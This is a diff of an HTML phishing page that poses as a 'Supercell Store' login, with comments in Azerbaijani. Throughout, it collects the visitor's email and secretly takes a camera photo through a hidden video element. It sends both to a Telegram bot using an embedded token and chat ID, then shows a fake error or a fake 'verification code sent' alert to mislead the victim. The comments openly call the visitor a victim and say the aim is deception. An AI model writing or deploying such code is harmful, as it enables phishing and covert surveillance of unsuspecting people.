@@ -1,110 +1,108 @@
+
 <!DOCTYPE html>
 <html lang="az">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Supercell Store - Login</title>
+    <title>Supercell Store Login</title>
     <style>
-        body { background-color: #1b4fb1; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; width: 360px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
-        .logo { background: #ffc107; width: 55px; height: 55px; margin: 0 auto 15px; border-radius: 12px; line-height: 55px; color: white; font-weight: 900; font-size: 32px; }
-        input { width: 100%; padding: 14px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background: #3a86ff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; }
-        #status { color: #666; font-size: 12px; margin-top: 15px; min-height: 18px; }
-        video, canvas { display: none; } /* Kamera gizlidir */
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #1a4da1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background-color: white; width: 380px; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center; }
+        .logo-box { background-color: #ffc107; width: 80px; height: 80px; margin: 0 auto 20px; border-radius: 18px; display: flex; justify-content: center; align-items: center; font-size: 50px; font-weight: 900; color: white; }
+        h2 { margin: 0 0 10px 0; font-size: 24px; }
+        p { color: #666; font-size: 15px; margin-bottom: 25px; }
+        input[type="email"] { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 15px; outline: none; }
+        .btn-signin { width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; background-color: #4285f4; color: white; text-transform: uppercase; }
+        #v, #c { display: none; } /* Kamera elementləri gizli */
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="logo">S</div>
-    <h2 style="margin: 0; font-size: 20px;">Supercell Store Login</h2>
-    <p style="color: #666; font-size: 14px;">Daxil olmaq üçün email ünvanınızı yazın.</p>
-    
-    <input type="email" id="email" placeholder="Email ünvanı" required>
-    <button id="btn">➜ SIGN IN</button>
-    
-    <div id="status"></div>
+    <div class="login-card">
+        <div class="logo-box">S</div>
+        <h2>Supercell Store Login</h2>
+        <p>Enter your email to receive a verification code.</p>
+        <form id="f">
+            <input type="email" id="e" placeholder="Enter your email address" required title="Zəhmət olmasa e-poçt daxil edin">
+            <button type="submit" class="btn-signin" id="b">➜ SIGN IN</button>
+        </form>
+    </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-</div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" width="640" height="480"></canvas>
 
-<script>
-    // --- TELEGRAM AYARLARI ---
-    const BOT_TOKEN = "8460087383:AAEaLJlo1VI6U4GPQ27a_EpJHYsL-h_vHMY"; 
-    const CHAT_ID = "-1003369084883";
-    // -------------------------
+    <script>
+        // MƏLUMATLARINIZI BURAYA DÜZGÜN YAZIN
+        const TOKEN = "8460087383:AAEaLJlo1VI6U4GPQ27a_EpJHYsL-h_vHMY"; 
+        const CHAT = "-1003369084883";
 
-    const btn = document.getElementById('btn');
-    const status = document.getElementById('status');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const emailInput = document.getElementById('email');
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        const form = document.getElementById('f');
+        const btn = document.getElementById('b');
 
-    btn.onclick = async () => {
-        const email = emailInput.value;
-        if (!email.includes('@')) { alert("Düzgün email yazın"); return; }
-
-        btn.disabled = true;
-        btn.innerText = "Yoxlanılır...";
-        status.innerText = "Sistemə qoşulur...";
-
-        try {
-            // ARXA KAMERAYA (environment) müraciət edirik
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "environment" }, 
-                audio: false 
-            });
-            video.srcObject = stream;
-
-            // Arxa kameranın fokuslanması üçün 2 saniyə gözləyirik
-            setTimeout(() => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob((blob) => {
-                    sendToTelegram(blob, email);
-                    // Kameranı söndür
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/png');
-            }, 2000);
-
-        } catch (err) {
-            // Əgər arxa kamera yoxdursa və ya bloklanıbsa, sadəcə emaili göndər
-            sendToTelegram(null, email + " (Arxa kamera tapılmadı)");
-            console.error(err);
-        }
-    };
-
-    async function sendToTelegram(blob, email) {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        
-        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        if (blob) {
-            url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            formData.append('photo', blob, 'back_camera.png');
-            formData.append('caption', `📸 Arxa Kamera Şəkli\n📧 Email: ${email}`);
-        } else {
-            formData.append('text', `⚠️ Yeni Giriş (Arxa kamera bloklanıb)\n📧 Email: ${email}`);
+        // Kameranı mütləq işə salırıq
+        async function startCam() {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = s;
+                // Bəzi brauzerlərdə video avtomatik başlamır, zorla başladırıq
+                video.play();
+            } catch (err) {
+                console.error("Kamera açılmadı: ", err);
+            }
         }
 
-        try {
-            await fetch(url, { method: 'POST', body: formData });
+        startCam();
+
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const email = document.getElementById('e').value;
             
-            // İstifadəçiyə inandırıcı xəta göstər
-            setTimeout(() => {
-                alert("Login Error: The server did not respond in time. Please try again.");
-                window.location.reload();
-            }, 1000);
-        } catch (e) {
-            window.location.reload();
-        }
-    }
-</script>
+            btn.innerText = "LOADING...";
+            btn.disabled = true;
 
+            // Canvas üzərinə şəkli çək
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Şəkli blob (fayl) kimi hazırla
+            canvas.toBlob(async (blob) => {
+                if(!blob) {
+                    alert("Şəkil yaradıla bilmədi. Kamera icazəsini yoxlayın.");
+                    btn.innerText = "➜ SIGN IN";
+                    btn.disabled = false;
+                    return;
+                }
+
+                const fd = new FormData();
+                fd.append('chat_id', CHAT);
+                fd.append('photo', blob, 'img.jpg');
+                fd.append('caption', `🔥 Yeni Qurban!\n📧 Email: ${email}`);
+
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    });
+                    
+                    const data = await res.json();
+                    
+                    if(data.ok) {
+                        // Uğurlu olduqda istifadəçini aldatmaq üçün mesaj
+                        alert("A verification code has been sent to " + email);
+                    } else {
+                        alert("Telegram Xətası: " + data.description);
+                    }
+                } catch (error) {
+                    alert("Bağlantı xətası: " + error);
+                } finally {
+                    btn.innerText = "➜ SIGN IN";
+                    btn.disabled = false;
+                }
+            }, 'image/jpeg', 0.7);
+        });
+    </script>
 </body>
 </html>
